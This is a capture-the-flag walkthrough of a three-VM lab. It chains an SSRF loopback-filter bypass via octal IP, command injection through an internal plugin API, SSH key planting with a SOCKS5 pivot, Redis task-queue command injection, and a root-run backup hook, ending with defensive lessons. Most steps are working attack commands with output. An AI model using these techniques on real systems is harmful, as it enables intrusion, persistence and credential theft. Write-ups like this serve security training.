#### Machine name : NEXUS-FABRIC

#### OS : Ubuntu 24.04 LTS (3-Host Chained Multi-VM Architecture)

#### Level : Hard

---

### 1. **Perimeter Reconnaissance & Port Scanning (VM 1)**

A comprehensive full TCP port scan against the external perimeter target (`10.211.55.10`) reveals exposed services: standard OpenSSH on port 22 and an HTTP service on port 80 powered by an Nginx reverse proxy routing to the internal Werkzeug application gateway on port 3000.

```bash
nmap -sC -sV -p- 10.211.55.10
```

![[Screenshot 2026-09-05 at 11.43.20.png]]

The scan confirms that `10.211.55.10` acts as the edge gateway (`nexus-edge.nexusfabric.internal`) for the enterprise network. We add the domain mappings to our local `/etc/hosts` file for convenient domain resolution:

```bash
echo "10.211.55.10 nexus-edge.nexusfabric.internal gateway.nexusfabric.internal" | sudo tee -a /etc/hosts
echo "10.211.55.11 nexus-broker.nexusfabric.internal broker.nexusfabric.internal" | sudo tee -a /etc/hosts
echo "10.211.55.12 nexus-core.nexusfabric.internal ledger.nexusfabric.internal" | sudo tee -a /etc/hosts
```

---

### 2. **Web Gateway & Webhook Diagnostic Sandbox Reconnaissance (VM 1)**

Navigating to `http://10.211.55.10/` loads the **NexusFabric Financial Service Mesh Gateway** dashboard. The portal provides live telemetry diagnostics for external partner integrations and exposes an automated Webhook Diagnostic Sandbox.

```bash
curl -s http://10.211.55.10/
```

![[Screenshot 2026-09-05 at 11.29.46.png]]

The diagnostic form dispatches HTTP requests via `POST /api/v1/webhook/test` taking a `url` parameter to validate outbound webhook callbacks.

---

### 3. **SSRF Filter Bypass & Internal Configuration Disclosure (VM 1)**

Testing loopback requests (`http://127.0.0.1/` or `http://localhost/`) against the `/api/v1/webhook/test` endpoint triggers a security filter:
```json
{
  "status": "forbidden",
  "message": "Loopback references to localhost or 127.0.0.1 are restricted by policy."
}
```

The filter performs simple string matching against `127.0.0.1` and `localhost`. We bypass this constraint by supplying alternative IP encodings, such as the octal representation of loopback (`http://0177.0.0.1:8081/internal/config`):

```bash
curl -s -X POST http://10.211.55.10/api/v1/webhook/test   -H "Content-Type: application/json"   -d '{"url": "http://0177.0.0.1:8081/internal/config"}' | jq .
```

![[Screenshot 2026-09-05 at 11.36.58.png]]

![[Screenshot 2026-09-05 at 11.37.48.png]]

The internal management daemon responds with HTTP 200, exposing critical mesh cluster architecture and credentials:
```json
{
  "admin_credentials": {
    "admin_api_key": "nexus_adm_sec_9938177",
    "cluster_token": "nexus_cluster_auth_8819"
  },
  "mesh_cluster": {
    "broker_host": "10.211.55.11",
    "broker_redis_port": 6379,
    "core_host": "10.211.55.12",
    "core_vault_port": 8200
  },
  "service": "nexus-edge-internal-daemon",
  "version": "2.4.1"
}
```

---

### 4. **Internal Plugin Command Injection ➔ Initial Foothold (VM 1)**

The internal management service hosts an administrative execution endpoint at `/api/v1/plugins/execute` requiring authentication via the `X-Nexus-Admin-Key` header or `key` parameter. By chaining our loopback SSRF primitive with the harvested `admin_api_key` (`nexus_adm_sec_9938177`), we execute arbitrary system commands under the `nexus-app` service account:

```bash
curl -s -X POST http://10.211.55.10/api/v1/webhook/test   -H "Content-Type: application/json"   -d '{"url": "http://0177.0.0.1:8081/api/v1/plugins/execute?key=nexus_adm_sec_9938177&command=id"}' | jq .
```

![[Screenshot 2026-09-05 at 11.39.42.png]]

The server responds with execution output: `uid=1504(nexus-app) gid=1504(nexus-app) groups=1504(nexus-app),27(sudo)`. We have established an active foothold on VM 1.

---

### 5. **User Flag Capture (`local.txt`) (VM 1)**

With command execution established under the `nexus-app` user account, we retrieve the local proof flag located in the home directory (`/home/nexus-app/local.txt`):

```bash
curl -s -X POST http://10.211.55.10/api/v1/webhook/test   -H "Content-Type: application/json"   -d '{"url": "http://0177.0.0.1:8081/api/v1/plugins/execute?key=nexus_adm_sec_9938177&command=cat+/home/nexus-app/local.txt"}' | jq .
```

![[Screenshot 2026-09-05 at 11.40.30.png]]

The JSON response captures the 32-character hexadecimal verification token: `ca04eb6ecfc43bd124de7e7d4a1c4a88`. **USER FLAG** captured.

---

### 6. **SSH Key Persistence & Dynamic SOCKS5 Pivoting**

Having established arbitrary command execution under the `nexus-app` service account in Step 4, we establish an interactive and persistent pivot channel without relying on undisclosed passwords. We generate an SSH keypair on our attack machine and inject our public key into `/home/nexus-app/.ssh/authorized_keys` using our SSRF execution primitive:

```bash
# Generate local Ed25519 keypair
ssh-keygen -t ed25519 -N "" -f ~/.ssh/id_ed25519

# Inject public key into VM 1 authorized_keys via the SSRF execution primitive
KEY=$(cat ~/.ssh/id_ed25519.pub | base64 | tr -d '\n')
curl -s -X POST http://10.211.55.10/api/v1/webhook/test \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://0177.0.0.1:8081/api/v1/plugins/execute?key=nexus_adm_sec_9938177&command=mkdir+-p+/home/nexus-app/.ssh;echo+$KEY|base64+-d>>/home/nexus-app/.ssh/authorized_keys;chmod+600+/home/nexus-app/.ssh/authorized_keys;chmod+700+/home/nexus-app/.ssh\"}" | jq .
```

With our public key registered in the target user's profile, we establish an SSH dynamic SOCKS5 proxy on local port 1080 to route traffic across the perimeter boundary into the internal network segment:

```bash
ssh -D 1080 -N -f -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 nexus-app@10.211.55.10
```

![[Screenshot 2026-09-05 at 15.09.35.png]]

The proxy tunnel allows transparent routing (`socks5://127.0.0.1:1080`) through VM 1 directly into the private cluster network hosting VM 2 and VM 3.

---

### 7. **Internal Task Mesh Discovery & Redis Queue Reconnaissance (VM 2)**

Using our pivot through VM 1, we perform port enumeration against the internal broker host (`10.211.55.11`):

```bash
proxychains nmap -sT -Pn -p 22,6379 10.211.55.11
```

![[Screenshot 2026-09-05 at 15.13.17.png]]

The scan confirms an exposed Redis 7.x service on port 6379 alongside OpenSSH on port 22. We test authentication using the leaked cluster password (`nexus_cluster_auth_8819`):

```bash
proxychains redis-cli -h 10.211.55.11 -a "nexus_cluster_auth_8819" PING
```

![[Screenshot 2026-09-05 at 15.14.02.png]]

The Redis instance responds with `PONG`. Inspecting the active keys confirms an asynchronous task processing queue named `nexus:tasks:queue`.

---

### 8. **Authenticated Redis Task Queue Command Injection (VM 2)**

A background task worker daemon (`nexus-worker.service`) continuously consumes JSON task definitions from the `nexus:tasks:queue` list using `BLPOP`. The worker handler supports an action named `system_sync` which evaluates the supplied `command` via shell execution under the `worker-svc` account context.

We construct a task payload to execute arbitrary commands on VM 2 and retrieve the output via `nexus:tasks:results`:

```bash
proxychains redis-cli -h 10.211.55.11 -a "nexus_cluster_auth_8819" LPUSH "nexus:tasks:queue"   '{"action": "system_sync", "payload": {"command": "id; whoami"}}'

proxychains redis-cli -h 10.211.55.11 -a "nexus_cluster_auth_8819" BRPOP "nexus:tasks:results" 5
```

![[Screenshot 2026-09-05 at 15.15.55.png]]

The worker evaluates the task, returning `uid=1002(worker-svc) gid=1002(worker-svc) groups=1002(worker-svc),27(sudo)` and confirming command execution under the `worker-svc` account context. We have achieved arbitrary remote code execution on VM 2.

---

### 9. **Core Ledger Credentials & Maintenance Token Harvesting (VM 2)**

From our execution foothold as `worker-svc`, we enumerate the application directory (`/opt/nexus-worker/`) and inspect the upstream cluster connection profile stored at `/opt/nexus-worker/secrets/core_access.json`:

```bash
proxychains redis-cli -h 10.211.55.11 -a "nexus_cluster_auth_8819" LPUSH "nexus:tasks:queue"   '{"action": "system_sync", "payload": {"command": "cat /opt/nexus-worker/secrets/core_access.json"}}'

proxychains redis-cli -h 10.211.55.11 -a "nexus_cluster_auth_8819" BRPOP "nexus:tasks:results" 5
```

![[Screenshot 2026-09-05 at 15.18.42.png]]

The returned JSON payload exposes the upstream credentials for VM 3:
```json
{
  "service": "nexus-broker-upstream-client",
  "description": "Upstream Core Vault & Ledger RPC Credentials",
  "target_core_host": "10.211.55.12",
  "core_rpc_port": 9090,
  "maintenance_token": "maint_tok_9918274100",
  "vault_approle": {
    "role_id": "approle_nexus_mesh_root_operator",
    "secret_id": "sec_id_99201481029411"
  }
}
```

We harvest the privileged administrative token:
* **Target Core Host:** `10.211.55.12:9090`
* **Maintenance Token:** `maint_tok_9918274100`

---

### 10. **Double-Hop Pivoting to Isolated Core RPC Daemon (VM 3)**

We pivot through VM 2 or utilize our existing routing channel to probe the isolated core host (`10.211.55.12`) on port 9090. We send a health check request to `/health`:

```bash
curl -s http://10.211.55.12:9090/health | jq .
```

![[Screenshot 2026-09-05 at 15.19.33.png]]

The service responds:
```json
{
  "cluster_state": "isolated",
  "service": "nexus-core-ledger-rpc",
  "status": "healthy"
}
```

This confirms the Core Ledger RPC daemon is online and receptive to maintenance commands.

---

### 11. **Malicious Pre-Backup Hook Script Registration (VM 3)**

The Core RPC daemon provides an administrative endpoint at `/api/v1/ledger/backup/config` to register automated maintenance hooks before snapshots are generated. The endpoint requires the `X-Nexus-Maintenance-Token` header.

Using our recovered token `maint_tok_9918274100`, we inject a bash hook into `/var/lib/nexus/hooks.d/pre-backup.sh` instructing the daemon to output the root proof flag:

```bash
curl -s -X POST http://10.211.55.12:9090/api/v1/ledger/backup/config   -H "Content-Type: application/json"   -H "X-Nexus-Maintenance-Token: maint_tok_9918274100"   -d '{"hook_content": "#!/usr/bin/env bash\nid\ncat /root/proof.txt\n"}' | jq .
```

![[Screenshot 2026-09-05 at 15.20.23.png]]

The server acknowledges registration with `{"message": "Pre-backup hook script registered successfully", "status": "success"}`.

---

### 12. **Root Privilege Escalation & Proof Flag Verification (`proof.txt`) (VM 3)**

Finally, we trigger the backup orchestrator via `POST /api/v1/ledger/backup/trigger`. The RPC daemon invokes `/usr/local/bin/nexus-ledger-backup` via `sudo` without a password. The backup utility executes the registered pre-backup hook script directly with `root` privileges:

```bash
curl -s -X POST http://10.211.55.12:9090/api/v1/ledger/backup/trigger   -H "X-Nexus-Maintenance-Token: maint_tok_9918274100" | jq .
```

![[Screenshot 2026-09-05 at 15.21.25.png]]

The JSON response captures the execution output:
```text
[*] NexusFabric Core Ledger Automated Backup Task (ROOT)
[*] Executing registered pre-backup hook: /var/lib/nexus/hooks.d/pre-backup.sh
uid=0(root) gid=0(root) groups=0(root)
67dd28c0ab61e02383c900882be22a3a
[+] Backup successfully created at: /var/backups/nexus-core-ledger-1788603665.tar.gz
```

The 32-character root token `67dd28c0ab61e02383c900882be22a3a` is confirmed. **ROOT FLAG** captured — completing the full takeover of the 3-VM chained enterprise cluster.

---

## Summary

> **NEXUS-FABRIC** simulates a realistic enterprise financial service mesh deployment spanning three dedicated hosts, chaining perimeter SSRF, asynchronous task queue injection, and privileged backup orchestration to achieve complete network takeover.
> 
> The attack starts at the external perimeter gateway (**VM 1**), where a Webhook Diagnostic Sandbox permits Server-Side Request Forgery (SSRF). By bypassing the loopback blacklist with octal IP notation (`0177.0.0.1`), the attacker queries the internal management daemon on port 8081, harvesting cluster administrative keys and Redis connection tokens. Invoking the internal plugin execution API through SSRF yields initial remote code execution under the `nexus-app` account and extracts the **User Flag**.
> 
> Leveraging an SSH dynamic SOCKS5 tunnel, the attacker pivots deeper into the internal network to target the task mesh broker (**VM 2**). Authenticating to Redis on port 6379 with the leaked cluster token, the attacker pushes a malicious task definition into `nexus:tasks:queue`. The host's background worker daemon evaluates the task, executing commands as `worker-svc` and leaking the upstream core maintenance token stored in `/opt/nexus-worker/secrets/core_access.json`.
> 
> Finally, reaching across the secondary network boundary to the isolated Core Ledger host (**VM 3**), the attacker authenticates to the RPC daemon on port 9090. Exploiting the pre-backup configuration interface, the attacker registers an arbitrary shell hook. Triggering the automated backup routine invokes the script with `root` authority via `sudo`, yielding complete compromise of the core ledger and capturing the **Root Flag**.
> 
> **The lesson:** Edge diagnostic endpoints must implement strict IP parsing and deny private CIDR ranges rather than relying on superficial hostname blacklists; message broker queues with code evaluation capabilities must authenticate and validate message schemas rigorously; and administrative maintenance hooks executed by root-level wrappers must be immutably secured to prevent privilege escalation from untrusted tiers.
